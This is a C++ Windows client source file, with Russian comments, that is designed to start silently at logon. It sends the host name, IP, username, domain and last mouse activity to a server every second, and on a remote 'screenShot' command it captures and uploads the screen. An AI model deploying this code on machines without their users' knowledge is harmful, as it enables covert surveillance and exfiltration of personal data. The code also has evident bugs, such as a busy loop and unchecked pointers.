// client.cpp: определяет точку входа для приложения.
//
#include "client.h"

std::mutex lockActivity;

std::string base64_encode(const std::vector<BYTE>& data)
{
	static const char encode_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string result;
	int val = 0;
	int valb = -6;

	for (size_t i = 0; i < data.size(); i++)
	{
		val = (val << 8) + data[i];
		valb += 8;
		while (valb >= 0)
		{
			result.push_back(encode_table[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6)
	{
		result.push_back(encode_table[((val << 8) >> (valb + 8)) & 0x3F]);
	}
	while (result.size() % 4)
	{
		result.push_back('=');
	}
	return result;
}

bool operator!=(const POINT& p1, const POINT p2) {
	return p1.x != p2.x || p1.y != p2.y;
}

// Функция для преобразования std::wstring в std::string
std::string ConvertWStringToString(const std::wstring& wstr) {
	// Рассчитываем необходимый размер строки
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
	if (size_needed <= 0) {
		return ""; // Обработка ошибок: пустая строка
	}

	// Создаём строку нужного размера (исключаем завершающий '\0')
	std::string str(size_needed - 1, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, nullptr, nullptr);
	return str;
}

//1 . starts silent on logon
//2 . collects data about activity (domain/machine/ip/username)
//3 . sends data to server using any protocol

ClientHandler::ClientHandler(const std::string& ip, uint16_t portSend, uint16_t portListen) {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed" << WSAGetLastError() << std::endl;
	}
	sockToSend = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	serverAddrSend.sin_family = AF_INET;
	serverAddrSend.sin_port = htons(portSend);
	inet_pton(AF_INET, ip.c_str(), &serverAddrSend.sin_addr);

	sockToListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockToListen == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
		WSACleanup();
		return;
	}

	serverAddrListen.sin_family = AF_INET;
	serverAddrListen.sin_addr.s_addr = INADDR_ANY; // Любой адрес
	serverAddrListen.sin_port = htons(8000);

	if (bind(sockToListen, (sockaddr*)&serverAddrListen, sizeof(serverAddrListen)) == SOCKET_ERROR) {
		std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
		closesocket(sockToListen);
		WSACleanup();
		return;
	}

	if (listen(sockToListen, SOMAXCONN) == SOCKET_ERROR) {
		std::cerr << "Listen failed: " << WSAGetLastError() << std::endl;
		closesocket(sockToListen);
		WSACleanup();
		return;
	}

	SetClientINFO();
	clientConnect();

	lastActivity = std::thread(&ClientHandler::MonitorActivity, this);

	screenSend = std::thread(&ClientHandler::listenForRequests, this);
	sendMsg = std::thread(&ClientHandler::sendRequests, this);
}
OPERATION_RESULT ClientHandler::clientConnect() {
	if (connect(sockToSend, (sockaddr*)&serverAddrSend, sizeof(serverAddrSend)) == SOCKET_ERROR) {
		std::cerr << "Connection to server (Send) failed" << WSAGetLastError() << std::endl;
		closesocket(sockToSend);
		WSACleanup();
		return OPERATION_RESULT::FAILURE;
	}
	return OPERATION_RESULT::SUCCESS;
}
	OPERATION_RESULT ClientHandler:: sendMessage(const std::string& jsonData, const std::string& handle) {

		std::ostringstream request;
		request << "POST " << handle << " HTTP/1.1\r\n" << "Host: 127.0.0.1:8080\r\n" << "Content-Type: application/json\r\n" << "Content-Length: " << jsonData.size() << "\r\n" << "\r\n" << jsonData;

		int byteSend = send(sockToSend, request.str().c_str(), request.str().length(), 0);

		if (byteSend == SOCKET_ERROR) {
			std::cerr << "Data send failed! " << WSAGetLastError() << std::endl;
			closesocket(sockToSend);
			WSACleanup();
			return OPERATION_RESULT::FAILURE;
		}
		std::cout << "Data send: " << jsonData << std::endl;
		return OPERATION_RESULT::SUCCESS;
	}
	std::string ClientHandler::GetActivity() {
		currentTimeOSS << std::put_time(std::localtime(&currentTime), "%Y-%m-%d %H:%M:%S");
		std::string str= currentTimeOSS.str();
		currentTimeOSS.str("");
		currentTimeOSS.clear();
		return str;
	}
	std::string ClientHandler::GetIP() {
		return clientIP;
	}
	std::string ClientHandler::GetClientMachine() {
		return clientMachine;
	}
	std::string ClientHandler::GetClientUserName() {
		return clientUserName;
	}
	std::string ClientHandler::GetDomainName() {
		return clientDomain;
	}
	ClientHandler::~ClientHandler() {
		if (lastActivity.joinable())
			lastActivity.join();
		closesocket(sockToSend);
		WSACleanup();
	}
	void ClientHandler::sendRequests() {
		std::string msg;
		while (true) {
			//std::unique_lock<std::mutex> lock(lockActivity);
			msg = R"({"clientMachine": ")" + GetClientMachine() +
				R"(", "clientIP": ")" + GetIP() +
				R"(", "LastActivity": ")" + GetActivity() +
				R"(", "clientUser": ")" + GetClientUserName() +
				R"(", "clientDomain": ")" + GetDomainName() +
				R"("})";
			//lock.unlock();
			sendMessage(msg, "/");
			std::this_thread::sleep_for(std::chrono::milliseconds(1000));
		}
	}
	// Функция для прослушивания входящих запросов
	void ClientHandler::listenForRequests() {
		char buf[1024];
		while (true) {
			// Ожидаем подключения
			int addrLen = sizeof(serverAddrListen);
			SOCKET clientSocket = accept(sockToListen, (sockaddr*)&serverAddrListen, &addrLen);

			if (clientSocket == INVALID_SOCKET) {
				std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
				continue;
			}

			// Читаем данные
			memset(buf, 0, sizeof(buf)); // Очищаем буфер
			int bytesReceived = recv(clientSocket, buf, sizeof(buf), 0);
			if (bytesReceived > 0) {
				std::string bufStr(buf, bytesReceived);

				if (bufStr == "screenShot") {
					// Захватываем скриншот, кодируем его в Base64
					std::string base64screenShot = base64_encode(captureScreenToMemory());
					std::string request = R"({"screenShot" : ")" + base64screenShot +R"(" , "ip": ")" + GetIP() + R"("})";

					// Отправляем сообщение
					sendMessage(request, "/screen_upload");
				}
			}
			else {
				std::cerr << "Receive failed or client disconnected: " << WSAGetLastError() << std::endl;
			}

			// Закрываем клиентский сокет
			closesocket(clientSocket);
		}
	}
	std::vector <BYTE> ClientHandler::captureScreenToMemory() {
		HDC hScreenDC = GetDC(nullptr);
		HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
		int width = GetDeviceCaps(hScreenDC, HORZRES);
		int height = GetDeviceCaps(hScreenDC, VERTRES);
		HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
		HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
		BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
		hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));

		BITMAPINFOHEADER biHeader = {};
		biHeader.biSize = sizeof(BITMAPINFOHEADER);
		biHeader.biWidth = width;
		biHeader.biHeight = height;
		biHeader.biPlanes = 1;
		biHeader.biBitCount = 24;
		biHeader.biCompression = BI_RGB;
		biHeader.biSizeImage = ((width * 24 + 31) / 32) * 4 * height;

		BITMAPFILEHEADER bfHeader = {};
		bfHeader.bfType = 0x4D42; // 'BM'
		bfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + biHeader.biSizeImage;
		bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		std::vector <BYTE> imageData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + biHeader.biSizeImage);
		memcpy(imageData.data(), &bfHeader, sizeof(BITMAPFILEHEADER));
		memcpy(imageData.data() + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));

		BYTE* lpPixels = new BYTE[biHeader.biSizeImage];
		GetDIBits(hMemoryDC, hBitmap, 0, height, lpPixels, (BITMAPINFO*)&biHeader, DIB_RGB_COLORS);
		memcpy(imageData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpPixels, biHeader.biSizeImage);

		delete[] lpPixels;
		DeleteObject(hBitmap);
		DeleteDC(hMemoryDC);

		return imageData;
	}
	void ClientHandler::MonitorActivity() {
		POINT currPos;
		POINT prevPos;
		GetCursorPos(&prevPos);
		while (true) {
			GetCursorPos(&currPos);
			if (currPos != prevPos) {
				prevPos = currPos;
				//std::unique_lock<std::mutex> lock(lockActivity);
				currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
				//lock.unlock();
			}
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}
	void ClientHandler::SetClientINFO()
	{
		char hostname[256];
		if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
		{
			//std::cerr << "[ERROR] gethostname() failed with error: " << WSAGetLastError() << std::endl;
			clientIP = ""; clientMachine = "";
		}
		struct addrinfo hints = { }, * res;
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;

		if (getaddrinfo(hostname, nullptr, &hints, &res) != 0)
		{
			//std::cerr << "[ERROR] getaddrinfo() failed" << std::endl;
			clientIP = ""; clientMachine = ""; 
		}
		LPWKSTA_INFO_102 domainName = NULL;
		if (NetWkstaGetInfo(NULL, 102, (LPBYTE*)&domainName) != NERR_Success) {
			std::cerr << "SET DOMAIN ERROR " << std::endl;
		}

		char nameBuf[256];
		unsigned int sizeBuf = sizeof(nameBuf);
		GetUserNameA(nameBuf, (DWORD*)&sizeBuf);
		//std::cout << nameBuf << std::endl;

		sockaddr_in* addr = reinterpret_cast<sockaddr_in*>(res->ai_addr);
		std::string ip = inet_ntoa(addr->sin_addr);
		freeaddrinfo(res);

		clientIP = ip; clientMachine = hostname; clientUserName = nameBuf; clientDomain = ConvertWStringToString(domainName->wki102_langroup);
	}

